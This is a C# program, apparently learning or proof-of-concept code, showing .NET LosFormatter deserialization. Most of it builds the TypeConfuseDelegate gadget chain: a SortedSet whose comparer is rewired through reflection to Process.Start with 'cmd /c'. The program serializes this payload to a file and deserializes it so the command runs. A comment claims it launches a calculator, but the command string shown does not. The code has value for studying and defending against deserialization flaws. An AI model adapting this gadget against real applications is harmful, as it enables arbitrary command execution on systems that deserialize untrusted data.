using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.UI;
using System.Windows.Forms;
using System.Reflection;

namespace LosFormatter_1
{
    [Serializable]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        public string Classname { get => classname; set => classname = value; }
        public string Name { get => name; set => name = value; }
        public int Age { get => age; set => age = value; }
        public override string ToString()
        {
            return base.ToString();
        }

        public static void ClassMethod(string value)
        {
            Process.Start(value);
        }
    }

    class Program
    {
        public static void LFSerialize()
        {
            TestClass testClass = new TestClass();
            testClass.Age = 18;
            testClass.Name = "bage";
            testClass.Classname = "fff";
            FileStream stream = new FileStream("./los.data", FileMode.Create);
            LosFormatter bFormat = new LosFormatter();
            bFormat.Serialize(stream, testClass);
            stream.Close();
        }

        public static void LFDeSer()
        {
            FileStream istream = new FileStream("./los.data", FileMode.Open);
            LosFormatter bFormat2 = new LosFormatter();
            var person = bFormat2.Deserialize(istream);
            istream.Close();
            MessageBox.Show(((TestClass)person).Name);

        }

        static SortedSet<string> TypeConfuseDelegateGadget()
        {
            StringBuilder sb = new StringBuilder();
            int i = 0;
            do
            {
                sb.Append(' ');
                i++;
            } while (i < 2000);

            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);

            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + sb);

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);
            return set;
        }

        // 生成 gadget
        static void SerializerPayload(SortedSet<string> set)
        {
            FileStream stream = new FileStream("./payload.data", FileMode.Create);
            LosFormatter bFormat = new LosFormatter();
            bFormat.Serialize(stream, set);
            stream.Close();
        }

        // 反序列化payload, 弹出计算器
        static void DeserPayload()
        {
            FileStream stream = new FileStream("./payload.data", FileMode.Open);
            LosFormatter bFormat = new LosFormatter();
            var person = bFormat.Deserialize(stream);
            stream.Close();
        }

        static void Main(string[] args)
        {
            //LFSerialize();
            //LFDeSer();

            SortedSet<string> set = TypeConfuseDelegateGadget();
            SerializerPayload(set);
            DeserPayload();

        }
    }
}
